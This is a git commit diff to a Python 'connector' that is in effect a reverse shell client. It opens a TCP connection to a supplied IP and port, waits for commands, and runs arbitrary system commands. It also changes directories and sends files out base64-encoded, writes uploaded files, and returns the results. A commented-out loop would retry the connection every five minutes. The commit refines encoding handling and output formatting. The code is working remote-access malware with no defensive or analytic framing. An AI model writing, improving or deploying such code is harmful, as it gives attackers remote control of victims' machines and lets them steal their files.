bc609d0014340c172ee04e1cf61c13edb7868252
Alexey <denier1025@gmail.com>
2018-09-06 03:48:51 +0300

    some changes

--- tcp_socket_connector/connector.py
+++ tcp_socket_connector/connector.py
@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import socket, subprocess, json, sys, os, base64
+import socket, subprocess, json, os, base64, time
 
 class Connector:
     def __init__(self, ip, port):
@@ -8,7 +8,13 @@ class Connector:
         self.connection.connect((ip, port))
 
     def reliable_send(self, data):
-        self.connection.send(json.dumps(data, encoding="cp866"))
+        while True:
+            try:
+                self.connection.send(json.dumps(data))
+                return
+            except UnicodeDecodeError:
+                data = "[-] 'utf-8' codec can't decode... Client side encoding is different than 'utf-8' and does not set.\r\n"
+                continue
 
     def reliable_receive(self):
         json_data = ""
@@ -25,32 +31,37 @@ class Connector:
 
     def change_working_directory_to(self, path):
         os.chdir(path)
-        return "[+] Changing working directory to " + path
+        return "[+] Changing working directory to " + path + "\r\n"
 
     def read_file(self, path):
-        with open(path, "rb") as file:
-            return base64.b64encode(file.read())
+        with open(path, "rb") as f:
+            return base64.b64encode(f.read())
 
     def write_file(self, path, content):
-        with open(path, "wb") as file:
-            file.write(base64.b64decode(content))
-            return "[+] Upload successful."
+        with open(path, "wb") as f:
+            f.write(base64.b64decode(content))
+            return "[+] Upload successful.\r\n"
 
     def run(self):
-        while True:
-            command = self.reliable_receive()
-            try:
-                if command[0] == "exit":
-                    self.connection.close()
-                    sys.exit()
-                elif command[0] == "cd" and len(command) > 1:
-                    command_result = self.change_working_directory_to(command[1])
-                elif command[0] == "download":
-                    command_result = self.read_file(command[1])
-                elif command[0] == "upload":
-                    command_result = self.write_file(command[1], command[2])
-                else:
-                    command_result = self.execute_system_command(command)
-            except Exception:
-                command_result = "[-] Error, during command execution."
-            self.reliable_send(command_result)
+        # while True:
+        #     try:
+                while True:
+                    command = self.reliable_receive()
+                    try:
+                        if command[0] == "exit":
+                            self.connection.close()
+                            return
+                        elif command[0] == "cd" and len(command) > 1:
+                            command_result = self.change_working_directory_to(command[1])
+                        elif command[0] == "download":
+                            command_result = self.read_file(command[1])
+                        elif command[0] == "upload":
+                            command_result = self.write_file(command[1], command[2])
+                        else:
+                            command_result = self.execute_system_command(command)
+                    except Exception:
+                        command_result = "[-] Exception during command execution.\r\n"
+                    self.reliable_send(command_result)
+            # except:
+            #     time.sleep(300)
+            #     continue
